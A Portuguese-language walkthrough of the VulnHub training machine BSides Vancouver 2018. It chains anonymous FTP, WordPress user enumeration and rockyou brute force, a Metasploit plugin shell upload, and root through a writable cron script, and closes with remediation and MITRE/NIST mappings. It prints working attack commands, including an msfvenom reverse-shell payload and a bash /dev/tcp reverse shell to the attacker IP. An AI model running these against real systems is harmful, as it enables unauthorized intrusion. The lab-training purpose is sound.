# BSides Vancouver: 2018 (Workshop) — Writeup (PT-BR)

> *FTP anônimo vaza uma lista de usuários, esse usuário leva a um WordPress com senha no rockyou, credenciais válidas de admin WP entregam um módulo do Metasploit, e o cron de limpeza é gravável. Essa máquina é basicamente um greatest-hits de técnicas de pentest para iniciante. Véi, foi feita pra workshop então era pra ser assim, mas ainda é top demais como revisão de fundamentos. GG.*

---

## Metadados da Máquina

| Campo | Valor |
|---|---|
| **Nível** | Iniciante |
| **VM Alvo** | BSides Vancouver: 2018 (Workshop) |
| **VM Atacante** | Kali Linux 2024.x (192.168.1.108) |
| **VulnHub URL** | https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/ |
| **Técnicas** | Login anônimo FTP, enumeração de usuários, enumeração de usuários WordPress (wpscan), brute-force de senha WordPress, Metasploit wp_admin_shell_upload, injeção em script de cron |
| **CVEs** | Nenhum (chain de misconfig; similar a CVE: credenciais fracas + config padrão) |
| **Relevância APT** | FTP anônimo e exploração de WordPress são rotineiros em campanhas de atores oportunistas; persistência via cron espelha técnicas usadas pelo Rocke Group e TeamTNT em intrusões cloud |

---

## Resumo do Ataque

```
[Atacante: 192.168.1.108]
          |
          v
nmap -p- -A 192.168.1.103
--> 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP WordPress)
          |
          v
ftp 192.168.1.103
login anônimo --> user.txt.bk --> dica de usuário
          |
          v
Acessar http://192.168.1.103/backup_wordpress/
wpscan --enumerate t,p,u
--> usuários: admin, john
          |
          v
wpscan --username john --wordlist rockyou.txt
--> john:enigma
          |
          v
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set rhost/targeturi/username/password
exploit --> sessão Meterpreter (www-data)
          |
          v
Encontrar script de cron gravável: /usr/local/bin/cleanup
download cleanup, injetar payload Python reverse shell do msfvenom
upload cleanup de volta --> sobrescrever
          |
          v
nc -lvp 9876
aguardar cron --> shell root
          |
          v
cat /root/flag.txt
         [ROOT]
```

---

## Metodologia

1. Varredura completa de portas: identificar FTP, SSH, HTTP
2. FTP anônimo: recuperar arquivo de backup de usuários exposto
3. Enumeração HTTP: identificar instalação WordPress e caminho
4. Enumeração de usuários WordPress com wpscan
5. Brute-force de senha contra usuário WordPress `john` usando rockyou.txt
6. Exploit Metasploit para upload de shell via admin WordPress (wp_admin_shell_upload)
7. Escalada de privilégio: identificar e sobrescrever script de cron gravável executado como root

---

## Passos

### Passo 1: Descoberta de Rede e Varredura Completa de Portas

**Contexto:** Como máquina de workshop, BSides Vancouver: 2018 mantém a superfície de ataque limpa mas ampla o suficiente para praticar múltiplas técnicas. A varredura completa de portas revela três serviços.

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -p- -A 192.168.1.103 --open -oN nmap-bsides.txt
```

**Saída esperada:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd x.x
22/tcp open  ssh     OpenSSH x.x
80/tcp open  http    Apache httpd 2.x
| http-title: ...WordPress...
```

**Alternativas:** `rustscan -a 192.168.1.103 -- -A` para enumeração mais rápida; `masscan -p 1-65535 --rate 5000` para descoberta de portas primeiro, depois `nmap -sV` direcionado nas portas descobertas.

**Nota real:** FTP na porta 21 raramente é necessário em deployments modernos. Sua presença sinaliza um sistema legado ou mal mantido. FTP anônimo é um achado crítico em qualquer avaliação externa.

**MITRE TTP:** T1595.001 - Varredura Ativa: Blocos de IP | T1046 - Descoberta de Serviço de Rede

---

### Passo 2: Enumeração FTP Anônimo

**Contexto:** Serviços vsftpd geralmente permitem login anônimo se não for explicitamente desabilitado. Verificar arquivos legíveis que revelam nomes de usuário, caminhos ou credenciais.

```bash
ftp 192.168.1.103
# Usuário: anonymous
# Senha: (vazia, pressionar Enter)

ftp> ls
ftp> get user.txt.bk
ftp> quit

cat user.txt.bk
```

**Saída esperada:**
```
abatchy
john
mai
anne
doomguy
```

**Esses nomes de usuário são candidatos para brute-force de SSH e enumeração do WordPress.**

**Alternativas:** `wget ftp://anonymous:@192.168.1.103/user.txt.bk` para download por script; `nmap -p21 --script ftp-anon,ftp-ls 192.168.1.103` para verificação automática de FTP anônimo.

**Nota real:** FTP anônimo é um achado automático em avaliações de rede externas. NIST SP 800-123 (Guia para Segurança Geral de Servidor) recomenda explicitamente desabilitar FTP anônimo. Revelação de nomes de usuário amplifica todos os ataques subsequentes ao remover a necessidade de enumeração de usuários.

**MITRE TTP:** T1213 - Dados de Repositórios de Informação | T1087.001 - Descoberta de Conta: Conta Local

---

### Passo 3: Enumeração Web: Descoberta do WordPress

**Contexto:** A porta 80 hospeda uma instalação WordPress em um caminho não-padrão. Acessar `http://192.168.1.103/` e procurar indicadores de WP. Gobuster confirma o caminho `/backup_wordpress/`.

```bash
gobuster dir \
  -u http://192.168.1.103/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html \
  -o gobuster-bsides.txt
```

**Saída esperada:**
```
/backup_wordpress/ (Status: 301)
```

**Acessar:** `http://192.168.1.103/backup_wordpress/`

**Alternativas:** `wpscan --url http://192.168.1.103/ --enumerate vp` para detectar instalações WordPress automaticamente; `curl -s http://192.168.1.103/ | grep -i wordpress`.

**MITRE TTP:** T1083 - Descoberta de Arquivos e Diretórios

---

### Passo 4: Enumeração de Usuários WordPress

**Contexto:** wpscan pode enumerar usuários WordPress via parâmetro de URL `/?author=N`, API REST (`/wp-json/wp/v2/users`) ou feeds RSS. Executar enumeração completa no caminho WordPress descoberto.

```bash
wpscan \
  --url http://192.168.1.103/backup_wordpress/ \
  --enumerate t \
  --enumerate p \
  --enumerate u \
  --no-update
```

**Saída esperada:**
```
[i] User(s) Identified:
[+] admin
    | Found By: Author Posts - Display Name (Passive Detection)
[+] john
    | Found By: Author Id Brute Forcing (Aggressive Detection)
```

**Alternativas:** `curl 'http://192.168.1.103/backup_wordpress/?author=1'` para verificar manualmente redirecionamentos de arquivo de autor; `curl http://192.168.1.103/backup_wordpress/wp-json/wp/v2/users` se a API REST estiver habilitada.

**Nota real:** Enumeração de usuários WordPress via IDs de autor é um problema de 15 anos. O endpoint de usuários da API REST facilitou ainda mais. Mitigações: remover redirecionamentos de arquivo de autor, desabilitar listagem de usuários da API REST, usar plugins como "Stop User Enumeration." Plataformas de bug bounty frequentemente aceitam enumeração de usuários WP como achado informacional ou baixo.

**MITRE TTP:** T1087.001 - Descoberta de Conta: Conta Local

---

### Passo 5: Brute-Force de Senha WordPress

**Contexto:** Com o usuário `john` confirmado (e o nome `john` aparecendo no `user.txt.bk` do FTP), executar brute-force direcionado usando rockyou.txt.

```bash
wpscan \
  --url http://192.168.1.103/backup_wordpress \
  --username john \
  --passwords /usr/share/wordlists/rockyou.txt \
  --no-update
```

**Saída esperada:**
```
[SUCCESS] Login : john | Password : enigma
```

**Credenciais: `john:enigma`**

**Alternativas:** `hydra -l john -P /usr/share/wordlists/rockyou.txt 192.168.1.103 http-post-form '/backup_wordpress/wp-login.php:log=^USER^&pwd=^PASS^:ERROR'`.

**Nota real:** "enigma" está no rockyou.txt. Contas WordPress com senhas de dicionário no rockyou (14M de entradas) caem em minutos em um CPU moderno. Organizações devem aplicar complexidade mínima de senha, bloqueio de conta e 2FA para todas as contas admin do WordPress. Páginas de login do WP admin devem ser restritas por IP quando possível.

**MITRE TTP:** T1110.001 - Força Bruta: Adivinhação de Senha

---

### Passo 6: Upload de Shell via Admin WordPress com Metasploit

**Contexto:** Com credenciais válidas de admin WordPress, usar o módulo `wp_admin_shell_upload` do Metasploit para fazer upload de um plugin malicioso contendo um reverse shell.

```bash
msfconsole -q

use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 192.168.1.103
set targeturi /backup_wordpress
set username john
set password enigma
set lhost 192.168.1.108
exploit
```

**Saída esperada:**
```
[*] Authenticating with WordPress using john:enigma...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[+] Meterpreter session 1 opened

meterpreter> getuid
Server username: www-data
```

**Alternativas:** Upload manual de plugin ZIP malicioso via painel admin WP: Plugins > Adicionar Novo > Fazer Upload de Plugin. O plugin deve conter um PHP reverse shell. Usar `weevely` ou `msfvenom -p php/meterpreter_reverse_tcp`.

**Nota real:** Acesso admin ao WordPress equivale a execução remota de código. Não há patch para isso: é uma funcionalidade de design (admins podem instalar plugins). A correção é controle de acesso: restringir o painel admin a IPs confiáveis, implementar 2FA, e executar WP como usuário de baixo privilégio. Upload de plugin deve ser desabilitado em produção via `define('DISALLOW_FILE_MODS', true)` no `wp-config.php`.

**MITRE TTP:** T1190 - Exploit em Aplicação Pública | T1505.003 - Componente de Software de Servidor: Web Shell

---

### Passo 7: Escalada de Privilégio via Script de Cron Gravável

**Contexto:** Como `www-data`, enumerar cron jobs e scripts. Um script de limpeza em `/usr/local/bin/` é executado pelo cron do root mas é gravável pelo usuário atual (ou world-writable). Injetar um payload de reverse shell nele.

```bash
# Sessão Meterpreter:
meterpreter> shell
# Ou usar: meterpreter> execute -f /bin/bash -i

# Enumerar crons:
cat /etc/crontab
ls -la /usr/local/bin/cleanup

# Baixar o script de cleanup:
meterpreter> download /usr/local/bin/cleanup /tmp/cleanup
```

**No atacante: gerar payload Python reverse shell:**
```bash
msfvenom -p cmd/unix/reverse_python \
  lhost=192.168.1.108 lport=9876 \
  -f raw -o payload.txt

cat payload.txt >> /tmp/cleanup
```

**Preparar listener e fazer upload do script modificado:**
```bash
# Listener:
nc -lvp 9876

# Upload (Meterpreter):
meterpreter> upload /tmp/cleanup /usr/local/bin/cleanup
meterpreter> shell
chmod +x /usr/local/bin/cleanup
```

**Quando o cron disparar:**
```bash
id
# uid=0(root)
cat /root/flag.txt
```

**Alternativas:** Em vez do msfvenom, anexar um bash reverse shell: `echo 'bash -i >& /dev/tcp/192.168.1.108/9876 0>&1' >> /usr/local/bin/cleanup`.

**Nota real:** Scripts de cron graváveis por todos são um caminho imediato de escalada de privilégio. `pspy` detecta execuções de cron sem root. A correção: scripts de cron devem ser de propriedade do root com modo 750 (root rwx, grupo rx, outros nada), não graváveis pelo usuário web.

**MITRE TTP:** T1053.005 - Tarefa Agendada: Cron | T1059.006 - Interpretador de Comando e Script: Python

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Onde Encontrado | Usado Para |
|---|---|---|---|
| Nomes de usuário | john, admin, abatchy, mai, anne, doomguy | FTP user.txt.bk | Seleção de alvo para brute-force no WordPress |
| Credencial | `john:enigma` | Resultado de brute-force do wpscan | Login admin WordPress |
| Flag Root | `/root/flag.txt` | Pós-escalada via injeção no cron | Conclusão da máquina |

---

## Lições Aprendidas

| Achado | Relevância no Mundo Real |
|---|---|
| FTP anônimo expondo lista de usuários | Desabilitar FTP anônimo. Nomes de usuário habilitam ataques de credencial direcionados em todos os outros serviços. |
| WordPress em caminho não-padrão (/backup_wordpress) | Segurança por obscuridade não é segurança. Ferramentas automatizadas enumeram todos os caminhos. Installs WP de backup ou staging são frequentemente esquecidas e sem patch. |
| Enumeração de usuários WordPress via IDs de autor | Desabilitar páginas de arquivo de autor; restringir API REST. Esses caminhos vazam nomes de usuário para usuários não autenticados. |
| Senha fraca de admin WordPress no rockyou.txt | Aplicar senhas fortes e 2FA para todas as contas admin WP. Limitar tentativas de login com plugin ou regra WAF. |
| Admin WP = RCE via upload de plugin | Proteger acesso ao admin WP é crítico. Restringir a IPs, habilitar 2FA, desabilitar modificações de arquivo em produção. |
| Script de cron world-writable executado como root | Qualquer arquivo executado como root não deve ser gravável por usuários não-root. Auditar com `find /etc/cron* /usr/local/bin/ ! -user root`. |

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID |
|---|---|---|
| Reconhecimento | Varredura Ativa: Blocos de IP | T1595.001 |
| Descoberta | Descoberta de Serviço de Rede | T1046 |
| Coleta | Dados de Repositórios de Informação (FTP) | T1213 |
| Descoberta | Descoberta de Conta: Conta Local | T1087.001 |
| Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso Inicial | Exploit em Aplicação Pública | T1190 |
| Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Execução | Interpretador de Comando e Script: Python | T1059.006 |
| Persistência | Componente de Software de Servidor: Web Shell | T1505.003 |
| Escalada de Privilégio | Tarefa Agendada: Cron | T1053.005 |

---

## Remediação

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | ID.AM-2 | Inventariar todos os servidores FTP; desabilitar acesso anônimo; remover installs WP de backup |
| Proteger | PR.AC-1 | Aplicar credenciais fortes e 2FA para todas as contas admin WordPress |
| Proteger | PR.AC-4 | Restringir propriedade e permissões de scripts de cron apenas ao root |
| Detectar | DE.CM-1 | Monitorar logs de acesso FTP; alertar em logins anônimos e downloads incomuns |
| Detectar | DE.CM-3 | Monitorar modificações em arquivos em `/usr/local/bin/` e `/etc/cron*` |

### Controles NIST SP 800-53

| Controle | Requisito | Aplicabilidade |
|---|---|---|
| AC-17 | Acesso Remoto | Desabilitar FTP anônimo; exigir autenticação para todo acesso remoto |
| IA-5 | Gerenciamento de Autenticador | Aplicar complexidade de senha; implementar 2FA para contas web privilegiadas |
| CM-7 | Funcionalidade Mínima | Desabilitar upload de plugin em instâncias WP de produção; remover serviços FTP legados |
| AU-12 | Geração de Registro de Auditoria | Registrar todas as ações admin WP, sessões FTP e modificações de scripts de cron |
| CM-6 | Configurações | Aplicar CIS WordPress hardening benchmark; desabilitar listagem de usuários da API REST |

### Relevância CISA KEV

Sem CVEs diretos para esta máquina. Porém: CVE-2022-21661 (SQL injection WordPress), múltiplos CVEs de plugins WP na lista do CISA KEV. WordPress é o CMS mais visado globalmente; CISA emite regularmente avisos para vulnerabilidades relacionadas ao WordPress. FTP anônimo é sinalizado nos DISA STIGs para todos os sistemas DoD.

### C2M2 (Modelo de Maturidade de Capacidade em Cibersegurança)

| Domínio | Prática | Lacuna |
|---|---|---|
| ACM | ACM-1c | FTP anônimo + WP backup desprotegido = MIL0 |
| IAM | IAM-2b | Senha de dicionário em conta admin = MIL0 |
| ACM | ACM-2b | Script de cron gravável = MIL0 |

### Contramedidas MITRE D3FEND

| Técnica D3FEND | ID | Defende Contra |
|---|---|---|
| Análise de Tráfego de Rede | D3-NTA | Detecta callback de reverse shell do servidor web |
| Análise de Spawn de Processo | D3-PSA | Detecta cron gerando shell com privilégio root |
| Hardening de Credencial | D3-CH | Senha fraca de admin WordPress |
| Regras de Conteúdo de Arquivo | D3-FCR | Detecção de upload de plugin ZIP malicioso |
| Análise de Comportamento do Usuário | D3-UBA | Download anômalo de arquivos sensíveis via FTP |

---

## Considerações Finais

BSides Vancouver: 2018 é exatamente o que uma máquina de workshop deveria ser: limpa, linear, educativa e cobrindo múltiplas técnicas fundamentais em uma chain só. FTP anônimo para brute-force WordPress para Metasploit para injeção no cron, cada passo construindo sobre o anterior. Não é uma box difícil, mas é ótima pra mostrar o fluxo de ataque iniciante pra alguém ou pra aquecer antes de máquinas mais difíceis. A flag.txt em `/root` é merecida, mesmo que o caminho seja bem pavimentado. Chapéu pros organizadores do workshop por construírem algo tão coerente. GG, chain top demais.

Thanks guys!! (❍ᴥ❍ʋ)
